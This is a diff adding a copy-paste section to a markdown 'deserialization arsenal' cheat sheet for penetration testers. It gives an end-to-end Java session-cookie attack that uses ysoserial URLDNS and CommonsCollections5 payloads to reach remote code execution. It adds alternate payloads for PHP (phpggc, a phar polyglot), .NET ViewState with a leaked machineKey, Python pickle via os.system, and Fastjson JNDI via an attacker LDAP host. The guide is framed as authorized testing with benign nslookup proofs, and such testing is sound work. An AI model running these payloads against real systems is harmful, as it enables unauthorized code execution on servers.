@@ -1,8 +1,48 @@
 # Insecure Deserialization Arsenal — Recognition · Payloads · Gadget Tools (per language)
 
+**Author:** x8bitranjit
+
 > Companion to `DESERIALIZATION_TESTING_GUIDE.md`. Authorized testing only. Replace `YOUR-OOB` with your Collaborator/
 > Interactsh host. **Confirm with a blind DNS gadget first**, prove RCE with **one benign command** (`id`/`nslookup`),
 > then STOP. No shells/persistence; delete uploaded artifacts; tear down JNDI/LDAP/OOB servers.
+
+---
+
+## 0. The whole attack in one sequence (copy-paste — Java session-cookie deser → RCE)
+
+*What & when:* the end-to-end flagship as one runnable sequence — the arsenal twin of guide **§3.1**. The discipline: **poke → confirm blind (no code) → probe classpath → fire only the matching chain → prove RCE out-of-band → STOP.** Every command is benign; the moment an OOB callback lands, you stop.
+
+```bash
+OOB=uniq.oob.pro                                        # your interactsh/Collaborator host
+# The sink: a session cookie holding a base64 Java blob.  SESSION=rO0AB...  (rO0 = Java ObjectInputStream, §2)
+
+# --- Step 1: POKE — flip a byte of the cookie -> 500 + java.io.StreamCorruptedException / ObjectInputStream
+#     = it IS deserialized (a lead, not a finding).
+
+# --- Step 2: BLIND CONFIRM with ZERO code exec — URLDNS (no gadget dependency) ---
+java -jar ysoserial.jar URLDNS "http://$OOB" | base64 -w0     # -> set as SESSION cookie, request the page
+#   interactsh: DNS $OOB from <target IP> = server deserializes untrusted input (already HIGH, no code ran)
+
+# --- Step 3: FINGERPRINT the classpath (probe, don't spray) — GadgetProbe (Burp) ---
+#   GadgetProbe org.apache.commons.collections.functors.InvokerTransformer -> DNS hit = CommonsCollections chain will work
+
+# --- Step 4: FIRE the matching chain with a BENIGN OOB command ---
+java -jar ysoserial.jar CommonsCollections5 "nslookup rce.$OOB" | base64 -w0   # -> set as SESSION cookie, request page
+#   interactsh: DNS rce.$OOB from <target IP> = the server RAN nslookup = REMOTE CODE EXECUTION (Critical, CWE-502)
+
+# --- Step 5: STOP. One OOB command callback is the whole proof. No reverse shell, no data, no persistence. ---
+```
+
+**Alternate cash-outs (same "blind-confirm → matching tool → benign OOB → STOP" arc — pick by the §2 signature):**
+```bash
+# PHP  O:4:"..."  / phar (§5):   phpggc Laravel/RCE1 system "nslookup p.$OOB"    | (base64 into unserialize sink)
+#                                 phpggc -p phar -o evil.jpg Monolog/RCE1 system "nslookup p.$OOB"  (upload -> file-op trigger)
+# .NET  AAEAAAD///// / __VIEWSTATE (§6): ysoserial.exe -p ViewState -g TextFormattingRunProperties \
+#                                 -c "nslookup v.$OOB" --generator=<GEN> --validationkey=<KEY> --validationalg=SHA1
+#   (no MAC -> unauth; MAC on -> need machineKey: leak web.config via ../XXE/ or ../LFI/, guide §11 chain 1)
+# Python pickle / .pkl model (§7): __reduce__ -> (os.system, ("nslookup py.$OOB",))  -> base64 into the pickle sink
+# Fastjson/SnakeYAML @type (§4): {"@type":"...JdbcRowSetImpl","dataSourceName":"ldap://YOUR/x","autoCommit":true} + marshalsec
+```
 
 ---
 
